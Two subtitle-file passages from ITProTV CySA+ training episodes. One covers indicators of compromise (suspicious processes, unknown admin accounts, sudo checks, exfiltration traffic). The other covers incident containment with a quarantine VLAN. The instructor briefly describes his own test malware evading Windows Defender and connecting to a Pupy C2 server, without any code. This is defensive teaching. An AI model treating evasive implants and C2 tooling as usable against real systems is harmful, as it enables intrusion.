malware.\n\n451\n00:22:56.014 --> 00:22:58.037\nAlready antivirus, antimalware.\n\n452\n00:22:58.037 --> 00:23:02.856\nThat's to say hey, I know that that\npiece of software that you're trying to\n\n453\n00:23:02.856 --> 00:23:06.038\ninstall is,\nwe're gonna get rid of that for you.\n\n454\n00:23:06.038 --> 00:23:09.005\nSo keep that as,\nthere's also application white list and\n\n455\n00:23:09.005 --> 00:23:11.072\nblacklist in third party application.\n\n456\n00:23:11.072 --> 00:23:13.381\nSo use those at your discretion or\n\n457\n00:23:13.381 --> 00:23:18.340\nAzure level of expertise that can\ndefinitely help to connect process.\n\n458\n00:23:18.340 --> 00:23:22.229\nAll right, let's look for malicious\nprocesses, we've kinda alluded to that.\n\n459\n00:23:22.229 --> 00:23:23.037\nHow do we do that?\n\n460\n00:23:23.037 --> 00:23:25.780\nWell, we'll jump over\ninto our Windows system.\n\n461\n00:23:25.780 --> 00:23:30.449\nLet's get rid of our I've noticed that\nthere are no malicious programs or\n\n462\n00:23:30.449 --> 00:23:33.309\nfeatures that I see off\nthe top of my head, and\n\n463\n00:23:33.309 --> 00:23:36.936\nit helps that there's only three of them.\n&gt;&gt; [LAUGH]\n\n464\n00:23:36.936 --> 00:23:37.518\n&gt;&gt; Right, but\n\n465\n00:23:37.518 --> 00:23:40.320\nlet's go back to the task manager,\nlet me bring that up,\n\n466\n00:23:41.623 --> 00:23:45.880\nI like using the task manager, it's\nalways been pretty helpful at this stuff.\n\n467\n00:23:45.880 --> 00:23:49.971\nAnd I just wanna look through\nthe different processes that are running.\n\n468\n00:23:49.971 --> 00:23:52.616\nAnd I can sort them by name\nwhich I tend to like to do,\n\n469\n00:23:52.616 --> 00:23:56.387\ncuz it stops that real-time updating\nwere things are bouncing around.\n\n470\n00:23:56.387 --> 00:24:00.842\nAnd that can a little distracting and\nUnhelpful to the process of finding\n\n471\n00:24:00.842 --> 00:24:05.822\nerroneous software or malicious software\nthat might be lurking on your system.\n\n472\n00:24:05.822 --> 00:24:08.319\nAnd then I just start looking through,\nI see one app is running,\n\n473\n00:24:08.319 --> 00:24:10.363\nwhich is task manager,\nokay, I know that's good.\n\n474\n00:24:10.363 --> 00:24:13.404\nAnd then background processes running,\nyou get this COM Surrogate.\n\n475\n00:24:13.404 --> 00:24:17.663\nCortana is running,\na host processes for Windows task.\n\n476\n00:24:17.663 --> 00:24:20.947\nThere is no malware is running,\nhold on, what?\n\n477\n00:24:20.947 --> 00:24:21.915\n&gt;&gt; [LAUGH]\n\n478\n00:24:21.915 --> 00:24:23.903\n&gt;&gt; What are you talking, what is this?\n\n479\n00:24:23.903 --> 00:24:24.759\n&gt;&gt; If it was only that easy.\n\n480\n00:24:24.759 --> 00:24:26.122\n&gt;&gt; That would be easy,\n\n481\n00:24:26.122 --> 00:24:29.819\nI tried to make it as easily\ndiscoverable as possible.\n\n482\n00:24:29.819 --> 00:24:32.092\nI didn't want to be going,\nI just don't see it, Mike.\n\n483\n00:24:32.092 --> 00:24:35.661\nWe're gonna have to take a timeout,\nI can't find this thing, you know.\n\n484\n00:24:35.661 --> 00:24:40.319\nSo I named it malware, I do have malware\nthat I have infected this machine with,\n\n485\n00:24:40.319 --> 00:24:42.212\nI named it the process malware.\n\n486\n00:24:42.212 --> 00:24:46.654\nAnd we kind of saw that with my\nC2 server is ready to rock and\n\n487\n00:24:46.654 --> 00:24:50.837\nengage in conversations with\nthis piece of software.\n\n488\n00:24:50.837 --> 00:24:56.009\nBut if I see something,\nmaybe this was called System AD 32,\n\n489\n00:24:56.009 --> 00:25:03.285\nor just something that looks innocuous or\nsystem-like but I'm not familiar with it.\n\n490\n00:25:03.285 --> 00:25:04.700\nI'll give you a prime example.\n\n491\n00:25:04.700 --> 00:25:07.842\nI'm not really familiar\nwith this COM Surrogate.\n\n492\n00:25:07.842 --> 00:25:08.450\n&gt;&gt; Yeah.\n\n493\n00:25:08.450 --> 00:25:10.090\n&gt;&gt; I would then go to Google,\n\n494\n00:25:10.090 --> 00:25:13.157\nI would then go to Bing,\nI would go to Altavista.\n\n495\n00:25:13.157 --> 00:25:14.211\n&gt;&gt; [LAUGH]\n\n496\n00:25:14.211 --> 00:25:16.273\n&gt;&gt; Then I would look at this, and\n\n497\n00:25:16.273 --> 00:25:19.500\nI would look like yeah,\ndog file, all right.\n\n498\n00:25:19.500 --> 00:25:24.523\nI will look up what is COM Surrogate\nprocess in a Windows 10 operating system?\n\n499\n00:25:24.523 --> 00:25:26.714\nAnd I would see is that a known band?\n\n500\n00:25:26.714 --> 00:25:27.357\nIs that a known good?\n\n501\n00:25:27.357 --> 00:25:28.530\nWhat is this?\n\n502\n00:25:28.530 --> 00:25:31.325\nI'll get more information about it so\nI could discern whether or\n\n503\n00:25:31.325 --> 00:25:32.423\nnot this was something.\n\n504\n00:25:32.423 --> 00:25:34.693\nInteresting thing,\nthe malware that I've created,\n\n505\n00:25:34.693 --> 00:25:36.923\nI actually run Windows Defender\nagainst this thing.\n\n506\n00:25:36.923 --> 00:25:38.704\nIt did not discover it.\n&gt;&gt; Really?\n\n507\n00:25:38.704 --> 00:25:40.362\n&gt;&gt; It is in RAM, it is running.\n\n508\n00:25:40.362 --> 00:25:46.528\nI can connect to it right now if I jump\nover to here, go into my CD tools.\n\n509\n00:25:46.528 --> 00:25:52.326\nI think I've gotta go one more Pupy level,\nor Pupy I guess it is.\n\n510\n00:25:52.326 --> 00:25:55.036\nAnd then run my Pupy SH stuff.\n\n511\n00:25:55.036 --> 00:25:57.799\nIt will connect here in just a second.\n\n512\n00:25:57.799 --> 00:26:01.160\nCredentials, I should go put that in,\nthere we go.\n\n513\n00:26:01.160 --> 00:26:07.355\nAnd notice that all I did was\nstart my server, server started.\n\n514\n00:26:07.355 --> 00:26:10.903\nAnd in just a second we'll see, hey can\nI just make because of the beaconing,\n\n515\n00:26:10.903 --> 00:26:14.079\nremember we looked at beaconing,\nthat would take the show, right?\n\n516\n00:26:14.079 --> 00:26:17.400\nBut that's the process that's\nrunning the beaconing.\n\n517\n00:26:17.400 --> 00:26:23.097\nAnd once it beacons and you now see\nsession one has been opened, over here,\n\n518\n00:26:23.097 --> 00:26:28.713\nI'm not seeing anything and I have run\na random Windows Defender on this.\n\n519\n00:26:28.713 --> 00:26:31.763\nI do want to try malware bytes on it,\njust to see if that's,\n\n520\n00:26:31.763 --> 00:26:34.455\ncuz Malware bytes tends to be my go-to.\n&gt;&gt; Yes.\n\n521\n00:26:34.455 --> 00:26:35.465\n&gt;&gt; It is a very robust system.\n\n522\n00:26:35.465 --> 00:26:36.386\n&gt;&gt; They definitely keep it\n\n523\n00:26:36.386 --> 00:26:39.062\nup to date with the modern,\nalbeit latest signatures and I was like-\n\n524\n00:26:39.062 --> 00:26:40.272\n&gt;&gt; Yeah, so I would love to see, and\n\n525\n00:26:40.272 --> 00:26:42.018\nI know Windows Defender,\ndon't get me wrong.\n\n526\n00:26:42.018 --> 00:26:44.040\nIt's actually a pretty good system for\n\n527\n00:26:44.040 --> 00:26:48.274\nyou to get with your operating system you\nhave something that is trying to defend.\n\n528\n00:26:48.274 --> 00:26:52.615\nI applaud Microsoft for throwing that\nin there, making it prettier sweet and\n\n529\n00:26:52.615 --> 00:26:55.366\ntrying to follow some\nsecurity best practices.\n\n530\n00:26:55.366 --> 00:26:58.653\nBut I'm looking for these malicious\nprocesses, this is how we do it here.\n\n531\n00:26:58.653 --> 00:27:03.487\nAgain I would run a top or htop inside PS,\nand we also looked at that, and\n\n532\n00:27:03.487 --> 00:27:06.481\nsome Linux system going, what is malware?\n\n533\n00:27:06.481 --> 00:27:11.597\nUnauthorized changes,\ndo I see any kind of unauthorized changes?\n\n534\n00:27:11.597 --> 00:27:15.415\nNow this is gonna be on more sensitive\nthings, but it may be on lower level\n\n535\n00:27:15.415 --> 00:27:19.683\nthings to try to migrate themselves and\nmove themselves into a better position.\n\n536\n00:27:19.683 --> 00:27:22.769\nSo you need to be looking at just\nabout everything, monitoring and\n\n537\n00:27:22.769 --> 00:27:26.474\nauditing changes that occur and then\nlooking at that audit trail, let's see?\n\n538\n00:27:26.474 --> 00:27:27.533\nWhy, what?\n\n539\n00:27:27.533 --> 00:27:28.504\nWhy why was this change made?\n\n540\n00:27:28.504 --> 00:27:30.370\nRemember this is the event\nlog you're inside of.\n\n541\n00:27:30.370 --> 00:27:34.921\nWindows operating system and syslog\nsystems, or just about everything else.\n\n542\n00:27:34.921 --> 00:27:39.937\nAnd you can use this log or Windows,\nbut typically we use the event logs.\n\n543\n00:27:39.937 --> 00:27:42.046\nUnauthorized privileges.\n\n544\n00:27:42.046 --> 00:27:46.985\nWe can see that by bringing up the,\nwhat's that,\n\n545\n00:27:46.985 --> 00:27:52.406\nthe system or\nit's the computer management or local.\n\n546\n00:27:52.406 --> 00:27:56.408\nIf you were in an Active Directory\nenvironment, you'd use\n\n547\n00:27:56.408 --> 00:28:01.543\nthe Active Directory users and computers\nto look at the credentials there.\n\n548\n00:28:01.543 --> 00:28:06.698\nBut here, I'm going to local users and\ncomputers,\n\n549\n00:28:06.698 --> 00:28:12.454\nlook, do I see any user accounts\nthat I don't recognize?\n\n550\n00:28:12.454 --> 00:28:16.488\nIf I do I'm gonna wanna, let's say I\ndidn't recognize myself from [INAUDIBLE],\n\n551\n00:28:16.488 --> 00:28:17.807\nI have horrible amnesia.\n\n552\n00:28:17.807 --> 00:28:19.350\nWho's this Daniel Lowrie guy?\n\n553\n00:28:19.350 --> 00:28:21.011\nAnd I hit Properties.\n\n554\n00:28:21.011 --> 00:28:22.872\nI come over to this Member of tab, and\n\n555\n00:28:22.872 --> 00:28:25.648\nI see he's a part of\nthe Administrator's Group.\n\n556\n00:28:25.648 --> 00:28:26.905\nThat's an interesting thing.\n\n557\n00:28:26.905 --> 00:28:30.629\nIf I don't know who that is, and\nthey're a part of the administrator, or\n\n558\n00:28:30.629 --> 00:28:35.078\nI don't recognize that account itself,\nthat's part of the administrator's group,\n\n559\n00:28:35.078 --> 00:28:37.140\nI'm going to want to investigate that.\n\n560\n00:28:37.140 --> 00:28:38.719\nThat's gonna be a big sign.\n\n561\n00:28:38.719 --> 00:28:43.589\nSo we need to be looking for\nthose unauthorized privileges in Linux.\n\n562\n00:28:43.589 --> 00:28:46.842\nI will exit out of my CT server here.\n\n563\n00:28:46.842 --> 00:28:49.429\nLet's see, and then clear.\n\n564\n00:28:49.429 --> 00:28:51.016\nI can't-\n&gt;&gt; [LAUGH]\n\n565\n00:28:51.016 --> 00:28:52.957\n&gt;&gt; This is just a fun comedy of errors,\n\n566\n00:28:52.957 --> 00:28:53.615\neveryone.\n\n567\n00:28:53.615 --> 00:28:58.671\nAnd I can do sudo -l,\nit'll let me know user root may run\n\n568\n00:28:58.671 --> 00:29:03.954\nthe following commands on Collie,\nwhich are all of them.\n\n569\n00:29:03.954 --> 00:29:08.213\nSo if I run it again, a specific user, I\ndon't have any other users on the system.\n\n570\n00:29:08.213 --> 00:29:13.796\nBut if I'm running against user\ndlowrie as its sudo l -udlowrie,\n\n571\n00:29:13.796 --> 00:29:16.896\nthen it will show me what, dlowrie.\n\n572\n00:29:16.896 --> 00:29:21.766\nOr I could just SU into the dlowrie user,\nand run sudo -l, but I could also check\n\n573\n00:29:21.766 --> 00:29:26.144\nthe sudo privileges that I've given\nit by checking the groups itself.\n\n574\n00:29:26.144 --> 00:29:28.741\nSo you wanna be looking at these\nthings on a regular basis.\n\n575\n00:29:28.741 --> 00:29:34.659\nAlso looking for data exfiltration,\nthis is, I am actually grabbing copies of,\n\n576\n00:29:34.659 --> 00:29:38.281\nor maybe I'm copying\nthe entire hard drive over.\n\n577\n00:29:38.281 --> 00:29:41.143\nThat could take sometime depending\non size of the hard drive, so\n\n578\n00:29:41.143 --> 00:29:44.058\nlooking for that network traffic\nthat shows that data transfer,\n\n579\n00:29:44.058 --> 00:29:45.814\nsomething I wanna keep an eye open for.\n\n580\n00:29:45.814 --> 00:29:50.236\nUsing things like Wireshark to say,\nwhat's this connection, netstat,\n\n581\n00:29:50.236 --> 00:29:51.810\nwhat's this connection?\n\n582\n00:29:51.810 --> 00:29:53.756\nRemember, we've seen this already.\n\n583\n00:29:53.756 --> 00:29:56.813\nCommon application, really,\nsame kind of stuff, same story,\n\n584\n00:29:56.813 --> 00:29:58.766\ndifferent chapter to be honest with you.\n\n585\n00:29:58.766 --> 00:30:00.945\nIt's just gonna be specific\nto the application and\n\n586\n00:30:00.945 --> 00:30:03.080\nnot necessarily to\nthe operating system itself.\n\n587\n00:30:03.080 --> 00:30:06.362\nTypical things that you'll see\nwith this anomalous activity.\n\n588\n00:30:06.362 --> 00:30:10.658\nWhy am I seeing these extra data records?\n\n589\n00:30:10.658 --> 00:30:16.229\nMaybe its third party software\nis tracking inventory.\n\n590\n00:30:16.229 --> 00:30:18.859\nYou're starting to see new tables pop up,\nthings that's just like, hm,\n\n591\n00:30:18.859 --> 00:30:19.542\nwhat's going on?\n\n592\n00:30:19.542 --> 00:30:21.214\nThis is an anomalous activity.\n\n593\n00:30:21.214 --> 00:30:22.803\nI don't know where it came from.\n\n594\n00:30:22.803 --> 00:30:24.927\nIntroduction of new accounts.\n\n595\n00:30:24.927 --> 00:30:29.521\nI will side with the Windows operating\nsystem or any Linux or what any operating\n\n596\n00:30:29.521 --> 00:30:33.366\nsystem to be honest with you, and\nto say where did that come from?\n\n597\n00:30:33.366 --> 00:30:36.031\nWhat is that,\nit's part of the administrator's group.\n\n598\n00:30:36.031 --> 00:30:40.344\nI don't know who it is part of the admin\ngroup, we need to run down what's\n\n599\n00:30:40.344 --> 00:30:43.897\ngoing on and upload those logs and\nsee who had that account.\n\n600\n00:30:43.897 --> 00:30:46.855\nUnexpected outputs and\nother interesting thing,\n\n601\n00:30:46.855 --> 00:30:49.132\nand we may get some weird garbledness.\n\n602\n00:30:49.132 --> 00:30:50.535\nSometimes that happens,\n\n603\n00:30:50.535 --> 00:30:54.616\nother times you expect to see certain\nspecific certain data and you don't,\n\n604\n00:30:54.616 --> 00:30:59.160\nlooking for things of that nature,\nunexpected outbound communications, right?\n\n605\n00:30:59.160 --> 00:31:02.717\nThose hey, there's that dash a,\nwhat is that connection?\n\n606\n00:31:02.717 --> 00:31:04.136\nI don't recognize that.\n\n607\n00:31:04.136 --> 00:31:08.355\nLet's take a look at that fire wire shock,\nsee if we can't gather any data from that.\n\n608\n00:31:08.355 --> 00:31:10.264\nService interruption.\n\n609\n00:31:10.264 --> 00:31:12.456\nI'm trying to use the application.\n\n610\n00:31:12.456 --> 00:31:15.292\nI'm trying to work with the system and\nI'm unable to.\n\n611\n00:31:15.292 --> 00:31:20.241\nMaybe it's because a hacker or a third\nactor is using it to the extent that\n\n612\n00:31:20.241 --> 00:31:24.635\nit can no longer respond to you,\ncuz they're just eating it up.\n\n613\n00:31:24.635 --> 00:31:28.823\nMaybe not specifically DDOS-ing or\nDOS-ing it, but they're using it so\n\n614\n00:31:28.823 --> 00:31:32.611\nmuch that it's like it's being DOS for\neverybody else, except for\n\n615\n00:31:32.611 --> 00:31:35.154\nthe thread activist, who's engaged in it.\n\n616\n00:31:35.154 --> 00:31:36.711\nAnd then memory overflows.\n\n617\n00:31:36.711 --> 00:31:41.642\nI don't remember correctly, Windows\nOperating System does have like an error\n\n618\n00:31:41.642 --> 00:31:43.984\nthat says buffer overflow.\n&gt;&gt; Mm-hm.\n\n619\n00:31:43.984 --> 00:31:45.919\n&gt;&gt; Right, it doesn't necessarily mean that\n\n620\n00:31:45.919 --> 00:31:48.606\nyou're being attacked or\na buffer overflow has occurred,\n\n621\n00:31:48.606 --> 00:31:51.687\nit's just that the stack has\noverflowed and things have happened.\n\n622\n00:31:51.687 --> 00:31:55.030\nYou've had a memory dump and\nthe system has crashed,\n\n623\n00:31:55.030 --> 00:31:57.116\nor the application has crashed.\n\n624\n00:31:57.116 --> 00:31:58.090\nSometimes you'll see that.\n\n625\n00:31:58.090 --> 00:32:01.615\nSo if you see buffer overflow as\nan error in a Windows Operating System,\n\n626\n00:32:01.615 --> 00:32:05.320\nit doesn't necessarily mean that\na buffer overflow attack has occurred,\n\n627\n00:32:05.320 --> 00:32:08.113\nbut you'd probably wanna look into it.\n&gt;&gt; Absolutely, yeah.\n\n628\n00:32:08.113 --> 00:32:10.864\n&gt;&gt; Just because those attacks do occur.\n\n629\n00:32:10.864 --> 00:32:14.200\nSo indications of compromise inside\nof our host operating systems and our\n\n630\n00:32:14.200 --> 00:32:17.985\napplications that reside on them, pretty\nstraightforward to be honest with you.\n\n631\n00:32:17.985 --> 00:32:21.840\nJust look for those weird inky things\nthat are happening, things that you\n\n632\n00:32:21.840 --> 00:32:26.334\ndon't expect, and then start following the\nbreadcrumb trail to see where it leads.\n\n633\n00:32:26.334 --> 00:32:27.504\n&gt;&gt; All right, Daniel,\n\n634\n00:32:27.504 --> 00:32:29.780\nwords of wisdom there that we can live by.\n\n635\n00:32:29.780 --> 00:32:32.617\nSo I appreciate that,\ngreat demonstrations, great explanations.\n\n636\n00:32:32.617 --> 00:32:34.644\nHope everybody out there\nenjoyed watching this one.\n\n637\n00:32:34.644 --> 00:32:37.563\nSounding off for ITProTV,\nI've been your host, Mike Rodrick.\n\n638\n00:32:37.563 --> 00:32:38.416\n&gt;&gt; I'm Daniel Lowrie.\n\n639\n00:32:38.416 -->

00:00:08.297\n[MUSIC]\n\n4\n00:00:08.297 --> 00:00:11.846\n&gt;&gt; You're watching ITPro.TV.\n\n5\n00:00:11.846 --> 00:00:15.614\n&gt;&gt; Hello, welcome to another exciting\nepisode here at ITPro.TV, I'm your host,\n\n6\n00:00:15.614 --> 00:00:16.334\nMike Rodrick.\n\n7\n00:00:16.334 --> 00:00:21.268\nToday we're doing our CySA+, and in this\nepisode we're gonna be taking a look at\n\n8\n00:00:21.268 --> 00:00:23.783\npost-incident response and recovery.\n\n9\n00:00:23.783 --> 00:00:27.141\nHere to help us with that is none other\nthan Mr. Daniel Lowrie, welcome Daniel.\n\n10\n00:00:27.141 --> 00:00:28.605\n&gt;&gt; Hey, Mike, how's it going today?\n\n11\n00:00:28.605 --> 00:00:30.139\n&gt;&gt; Another day in paradise.\n\n12\n00:00:30.139 --> 00:00:31.034\n&gt;&gt; Paradise, isn't it?\n\n13\n00:00:31.034 --> 00:00:31.559\n&gt;&gt; Right?\n\n14\n00:00:31.559 --> 00:00:33.833\n&gt;&gt; When we say paradise, we mean CISA+.\n\n15\n00:00:33.833 --> 00:00:35.270\n&gt;&gt; [LAUGH]\n&gt;&gt; That's right,\n\n16\n00:00:35.270 --> 00:00:37.289\nlooking at that post-incident response and\n\n17\n00:00:37.289 --> 00:00:39.263\nrecovery things that\nwe need to go through.\n\n18\n00:00:39.263 --> 00:00:43.518\nAn incident has occurred, we've weathered\nthe storm, or maybe we haven't.\n\n19\n00:00:43.518 --> 00:00:45.009\n&gt;&gt; [LAUGH]\n&gt;&gt; Hopefully we have.\n\n20\n00:00:45.009 --> 00:00:45.610\n&gt;&gt; Hopefully.\n\n21\n00:00:45.610 --> 00:00:46.283\n&gt;&gt; Hopefully we have.\n\n22\n00:00:46.283 --> 00:00:47.414\nHow do we recover from that?\n\n23\n00:00:47.414 --> 00:00:50.365\nWhat are the steps that we can take\nto help that recovery process?\n\n24\n00:00:50.365 --> 00:00:53.677\nAnd then when it's all said and\ndone at the end of the day,\n\n25\n00:00:53.677 --> 00:00:57.761\nwhat are what are the post-incident\npieces that we need to engage in?\n\n26\n00:00:57.761 --> 00:01:01.736\nWhat are the activities that we need\nto engage in so that we can basically\n\n27\n00:01:01.736 --> 00:01:06.123\ndocument what has occurred and get back\nto business as normal and be prepared.\n\n28\n00:01:06.123 --> 00:01:10.705\nOr hopefully never need it, but\nprepared for the next incident if and\n\n29\n00:01:10.705 --> 00:01:12.128\nwhen it does happen.\n\n30\n00:01:12.128 --> 00:01:14.407\nThat's what we're gonna\ntake a look at today.\n\n31\n00:01:14.407 --> 00:01:17.115\n&gt;&gt; All right, sounds good,\nwhere do we start?\n\n32\n00:01:17.115 --> 00:01:19.449\n&gt;&gt; Well, let's start talking\nabout containment, right?\n\n33\n00:01:19.449 --> 00:01:22.036\nSo, let's start there, incidents can turn.\n\n34\n00:01:22.036 --> 00:01:26.590\nAn incident has occurred,\nwe need to recover from this.\n\n35\n00:01:26.590 --> 00:01:31.761\nOkay, we know what it is,\nwhat do we do, where do we start?\n\n36\n00:01:31.761 --> 00:01:36.330\nAnd it can be a multitude of different\ncontainment techniques that we employ.\n\n37\n00:01:36.330 --> 00:01:41.127\nOr it's just one specifically,\ndepending on, policy is, maybe regulation,\n\n38\n00:01:41.127 --> 00:01:42.547\nthings of that nature.\n\n39\n00:01:42.547 --> 00:01:46.830\nBut you need to be aware of\nwhat types you can engage in so\n\n40\n00:01:46.830 --> 00:01:50.753\nthat you can do them when\nyou're ready to do that.\n\n41\n00:01:50.753 --> 00:01:54.619\nSo let's talk about segmentation, that's\nprobably the most commonly used one.\n\n42\n00:01:54.619 --> 00:01:57.167\nWhich is where I basically say,\nyou know what,\n\n43\n00:01:57.167 --> 00:01:59.278\nI see that I have a compromised system.\n\n44\n00:01:59.278 --> 00:02:02.955\nI am going to carve out\na piece of the network and\n\n45\n00:02:02.955 --> 00:02:05.509\ngive it its own little network.\n\n46\n00:02:05.509 --> 00:02:09.509\nKeep it segregated from the rest of\nthe network service, segmenting that out.\n\n47\n00:02:09.509 --> 00:02:14.375\nTaking out little network knife and going\n[SOUND], choppy chop, this is for you.\n\n48\n00:02:14.375 --> 00:02:19.778\nAlthough still connected to the other\nnetworks, it does have a barrier around,\n\n49\n00:02:19.778 --> 00:02:25.426\ncuz I'm working with a VLAN, then this is\ngonna break up that broadcaster, right.\n\n50\n00:02:25.426 --> 00:02:28.165\n&gt;&gt; Mm-hm.\n&gt;&gt; So, I would need a router to get on it,\n\n51\n00:02:28.165 --> 00:02:31.640\nI would have my own collision\ndomain set off on that VLAN.\n\n52\n00:02:31.640 --> 00:02:35.413\nAnd I would add switch ports\nthat necessary to keep,\n\n53\n00:02:35.413 --> 00:02:38.002\ncuz it might just not be one system.\n\n54\n00:02:38.002 --> 00:02:42.251\n&gt;&gt; Right, exactly, depending on how\nsoon you've caught this could be one or\n\n55\n00:02:42.251 --> 00:02:45.427\nmultiple systems that need\nto part of this quarantine.\n\n56\n00:02:45.427 --> 00:02:49.033\nNow do you find that this VLAN is\nsomething I set up ahead of time and\n\n57\n00:02:49.033 --> 00:02:50.817\nhave ready for this situation?\n\n58\n00:02:50.817 --> 00:02:55.240\nOr is it my gosh, we're compromised,\nI need to do the segregation now?\n\n59\n00:02:55.240 --> 00:02:57.555\n&gt;&gt; Yeah,\nreally the answer to that question is yes.\n\n60\n00:02:57.555 --> 00:02:58.691\n&gt;&gt; [LAUGH]\n&gt;&gt; Right?\n\n61\n00:02:58.691 --> 00:03:00.025\nIt's one or the other, it could be both.\n\n62\n00:03:00.025 --> 00:03:02.677\nIt could be yes, I've done that,\nI've thought ahead.\n\n63\n00:03:02.677 --> 00:03:06.977\nAnd it is our policy to have\na quarantined VLAN off the side.\n\n64\n00:03:06.977 --> 00:03:11.947\nReady to rock in the case of an incident\nwhere I can just start moving switch\n\n65\n00:03:11.947 --> 00:03:16.129\nboards into said VLAN and\nnow they're on that isolated VLAN.\n\n66\n00:03:16.129 --> 00:03:19.404\nOr if I'm just that good,\nI don't need the time and\n\n67\n00:03:19.404 --> 00:03:21.917\nI want to, well I got some ports here but\n\n68\n00:03:21.917 --> 00:03:26.809\nI'm just gonna create the VLAN on the fly\nand give it to and now rock and roll.\n\n69\n00:03:26.809 --> 00:03:28.470\n&gt;&gt; Because you've got\nRonnie Wong on staff.\n\n70\n00:03:28.470 --> 00:03:29.511\n[LAUGH]\n&gt;&gt; Yeah,\n\n71\n00:03:29.511 --> 00:03:30.526\ncuz you've got Ronnie doing your job for\nyou, right?\n\n72\n00:03:30.526 --> 00:03:34.268\nThat could definitely be the case, there's\nsome very talented network engineers out\n\n73\n00:03:34.268 --> 00:03:35.608\nthere that work very quickly.\n\n74\n00:03:35.608 --> 00:03:40.546\nBut it is a good idea to go ahead and\njust have the VLAN at least there you\n\n75\n00:03:40.546 --> 00:03:44.226\nknow what number you might want to use for\nthe VLAN.\n\n76\n00:03:44.226 --> 00:03:45.705\n&gt;&gt; Kind of have an idea\nof where I need to go.\n\n77\n00:03:45.705 --> 00:03:46.294\n&gt;&gt; Exactly.\n\n78\n00:03:46.294 --> 00:03:49.982\n&gt;&gt; Got you.\n&gt;&gt; So when the worse happens and I go,\n\n79\n00:03:49.982 --> 00:03:53.942\nthe hosts on ports 12, 42, 43, and\n\n80\n00:03:53.942 --> 00:03:58.242\n19 are infected hosts\nof the same incident.\n\n81\n00:03:58.242 --> 00:04:03.586\nI'm gonna go ahead and just add those to\nquarantine VLAN 70 or whatever it is.\n\n82\n00:04:03.586 --> 00:04:07.100\nWe'll just call it quarantine,\nyou can name them, they're fun.\n\n83\n00:04:07.100 --> 00:04:09.029\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Throw them in there, and\n\n84\n00:04:09.029 --> 00:04:10.787\nnow at least there's some separation.\n\n85\n00:04:10.787 --> 00:04:14.557\nCuz a lot of times you think about it,\njust because you found out that an attack\n\n86\n00:04:14.557 --> 00:04:18.269\nis occurring, doesn't necessarily\nmean you want it to stop immediately.\n\n87\n00:04:18.269 --> 00:04:19.528\n&gt;&gt; Right.\n&gt;&gt; I know that sounds\n\n88\n00:04:19.528 --> 00:04:22.920\na little counter-intuitive, and\nsometimes it is counter-intuitive,\n\n89\n00:04:22.920 --> 00:04:25.035\nsometimes you do want\nto stop it immediately.\n\n90\n00:04:25.035 --> 00:04:28.400\nAgain, this is gonna come\ndown to regulation policy and\n\n91\n00:04:28.400 --> 00:04:33.054\nthe attack that is occurring It's not\nall one size fits all kind of solution,\n\n92\n00:04:33.054 --> 00:04:34.646\nit's a one size fits one.\n\n93\n00:04:34.646 --> 00:04:39.689\nSo you gotta look at the environment,\nlook at what's going on and\n\n94\n00:04:39.689 --> 00:04:45.755\ngo, would segmentation be the correct\nform of action as I look at this attack.\n\n95\n00:04:45.755 --> 00:04:48.435\nAnd should I chop him off on the Internet?\n\n96\n00:04:48.435 --> 00:04:51.186\nMaybe I wanna gather some more\ninformation for my network sniffer,\n\n97\n00:04:51.186 --> 00:04:53.901\nsee is there and any communication\nbetween them and the attacker.\n\n98\n00:04:53.901 --> 00:04:56.631\nGet some information about the attacker,\nnow.\n\n99\n00:04:56.631 --> 00:04:59.419\n&gt;&gt; If you're gonna try to prosecute or\ngo further,\n\n100\n00:04:59.419 --> 00:05:02.346\nyou might need more\ninformation to carry that out.\n\n101\n00:05:02.346 --> 00:05:05.025\nYou wanna gather as much and\nas soon as you quarantine them,\n\n102\n00:05:05.025 --> 00:05:08.896\nthe attacker's probably gonna have an idea\nthat they're on to me, let me stop.\n\n103\n00:05:08.896 --> 00:05:12.765\n&gt;&gt; Right, but if they do that, they can\ncan kind of slink away in the shadows and\n\n104\n00:05:12.765 --> 00:05:14.592\nthat's what we wanna try to avoid.\n\n105\n00:05:14.592 --> 00:05:17.528\nWe wanna get as much\ninformation as possible so\n\n106\n00:05:17.528 --> 00:05:21.155\nthat we can prosecute if necessary,\nduring the attack.\n\n107\n00:05:21.155 --> 00:05:26.163\nSo if cut off that network attack I\nmight be losing some good information.\n\n108\n00:05:26.163 --> 00:05:28.438\nThere's a flip side to that coin as well,\n\n109\n00:05:28.438 --> 00:05:31.633\nis that the attacker still has\ncontrol of those machines.\n\n110\n00:05:31.633 --> 00:05:36.680\nAnd if they then use those machines\nto attack other machines that\n\n111\n00:05:36.680 --> 00:05:41.453\nare not on your network,\nyou might be, hopefully the word.\n\n112\n00:05:41.453 --> 00:05:45.099\nThe best thing that could happen is,\nyou're saying, hey, sorry.\n\n113\n00:05:45.099 --> 00:05:45.825\n&gt;&gt; [LAUGH] Yeah.\n\n114\n00:05:45.825 --> 00:05:48.509\n&gt;&gt; We were attacked,\nwe're trying to get information.\n\n115\n00:05:48.509 --> 00:05:52.189\nAnd since they had control of these\nmachines, and they still have their\n\n116\n00:05:52.189 --> 00:05:56.171\nInternet access, they used that as\na platform to attempt an attack on you, or\n\n117\n00:05:56.171 --> 00:05:57.729\nperpetrate an attack on you.\n\n118\n00:05:57.729 --> 00:06:03.117\nSo now you have an incident, you have to\ngo through that, and man, that's our bad.\n\n119\n00:06:03.117 --> 00:06:03.894\n&gt;&gt; Yeah.\n[LAUGH]\n\n120\n00:06:03.894 --> 00:06:04.902\n&gt;&gt; Hopefully that's the conversation that\n\n121\n00:06:04.902 --> 00:06:06.403\nyou have,\n&gt;&gt; But that's not gonna be fun, but\n\n122\n00:06:06.403 --> 00:06:07.648\nthat is your best case scenario.\n\n123\n00:06:07.648 --> 00:06:09.802\n&gt;&gt; That is definitely\nthe best case scenario, so\n\n124\n00:06:09.802 --> 00:06:11.357\nthere is definitely a pro sound.\n\n125\n00:06:11.357 --> 00:06:14.815\nThe worse case scenario is a judge goes,\nyou owe xyz company,\n\n126\n00:06:14.815 --> 00:06:19.220\nx amount of dollars for damages,\nbecause you allowed an attack, knowingly.\n\n127\n00:06:19.220 --> 00:06:23.738\nYou kept a machine open knowingly,\nit could be used as an attack platform,\n\n128\n00:06:23.738 --> 00:06:25.688\nand therefore you're liable.\n\n129\n00:06:25.688 --> 00:06:29.144\nSo again, here brings our stakeholders,\nspeak with legal,\n\n130\n00:06:29.144 --> 00:06:31.736\nthey're gonna be able to\ninform with you on A,\n\n131\n00:06:31.736 --> 00:06:35.409\nwe're having a breach right now,\nshould we cut, should we not?\n\n132\n00:06:35.409 --> 00:06:39.471\nWhat can we do, how long before 